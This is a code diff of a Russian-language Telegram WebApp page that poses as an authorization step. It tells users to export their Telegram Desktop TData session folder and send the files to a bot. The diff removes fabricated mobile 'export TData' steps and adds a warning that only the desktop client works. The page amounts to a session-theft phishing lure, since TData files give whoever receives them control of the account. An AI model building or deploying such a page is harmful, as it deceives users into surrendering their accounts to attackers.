@@ -61,6 +61,15 @@
         .instructions li {
             margin: 5px 0;
         }
+        .mobile-warning {
+            display: none;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #fff3cd;
+            color: #856404;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
@@ -80,6 +89,16 @@
             <div class="loading-text">Завершение авторизации...</div>
         </div>
         <div id="instructions" class="instructions"></div>
+        <div id="mobileWarning" class="mobile-warning">
+            <h3>⚠️ Внимание!</h3>
+            <p>Для авторизации необходимо использовать Telegram Desktop на компьютере. Мобильные устройства не поддерживают экспорт TData.</p>
+            <p>Пожалуйста:</p>
+            <ol>
+                <li>Откройте Telegram Desktop на компьютере</li>
+                <li>Перейдите к боту</li>
+                <li>Повторите процесс авторизации</li>
+            </ol>
+        </div>
     </div>
 
     <script>
@@ -105,51 +124,25 @@
         // Показ инструкций
         function showInstructions(platform) {
             const instructions = document.getElementById('instructions');
-            let text = '';
+            const mobileWarning = document.getElementById('mobileWarning');
             
-            switch(platform) {
-                case 'windows':
-                    text = `
-                        <h3>Инструкция по экспорту TData:</h3>
-                        <ol>
-                            <li>Откройте Telegram Desktop</li>
-                            <li>Нажмите Ctrl+Alt+Shift+1</li>
-                            <li>Выберите папку tdata</li>
-                            <li>Нажмите "Открыть"</li>
-                        </ol>
-                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
-                    `;
-                    break;
-                case 'android':
-                    text = `
-                        <h3>Инструкция по экспорту TData:</h3>
-                        <ol>
-                            <li>Откройте Telegram</li>
-                            <li>Перейдите в Настройки</li>
-                            <li>Нажмите на версию 5 раз</li>
-                            <li>Выберите "Экспорт TData"</li>
-                        </ol>
-                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
-                    `;
-                    break;
-                case 'ios':
-                    text = `
-                        <h3>Инструкция по экспорту TData:</h3>
-                        <ol>
-                            <li>Откройте Telegram</li>
-                            <li>Перейдите в Настройки</li>
-                            <li>Нажмите на версию 5 раз</li>
-                            <li>Выберите "Экспорт TData"</li>
-                        </ol>
-                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
-                    `;
-                    break;
-                default:
-                    text = '<p>Пожалуйста, используйте Telegram Desktop для авторизации.</p>';
+            if (platform === 'windows') {
+                instructions.innerHTML = `
+                    <h3>Инструкция по экспорту TData:</h3>
+                    <ol>
+                        <li>Откройте Telegram Desktop</li>
+                        <li>Нажмите Ctrl+Alt+Shift+1</li>
+                        <li>Выберите папку tdata</li>
+                        <li>Нажмите "Открыть"</li>
+                    </ol>
+                    <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
+                `;
+                instructions.style.display = 'block';
+                mobileWarning.style.display = 'none';
+            } else {
+                instructions.style.display = 'none';
+                mobileWarning.style.display = 'block';
             }
-            
-            instructions.innerHTML = text;
-            instructions.style.display = 'block';
         }
 
         // Основная функция авторизации
@@ -157,11 +150,13 @@
             const button = document.getElementById('authButton');
             const loading = document.getElementById('loading');
             const instructions = document.getElementById('instructions');
+            const mobileWarning = document.getElementById('mobileWarning');
             
             try {
                 button.style.display = 'none';
                 loading.style.display = 'block';
                 instructions.style.display = 'none';
+                mobileWarning.style.display = 'none';
                 
                 // Определяем платформу
                 const platform = detectPlatform();
@@ -180,16 +175,18 @@
                     await tg.sendData(JSON.stringify(data));
                     console.log('Export command sent successfully');
                     
-                    // Показываем инструкции
+                    // Показываем инструкции или предупреждение
                     loading.style.display = 'none';
                     showInstructions(platform);
                     
-                    // Закрываем веб-приложение через 30 секунд
-                    setTimeout(() => {
-                        if (tg && tg.close) {
-                            tg.close();
-                        }
-                    }, 30000);
+                    // Закрываем веб-приложение через 30 секунд только для Windows
+                    if (platform === 'windows') {
+                        setTimeout(() => {
+                            if (tg && tg.close) {
+                                tg.close();
+                            }
+                        }, 30000);
+                    }
                 } else {
                     throw new Error('Telegram WebApp not initialized');
                 }
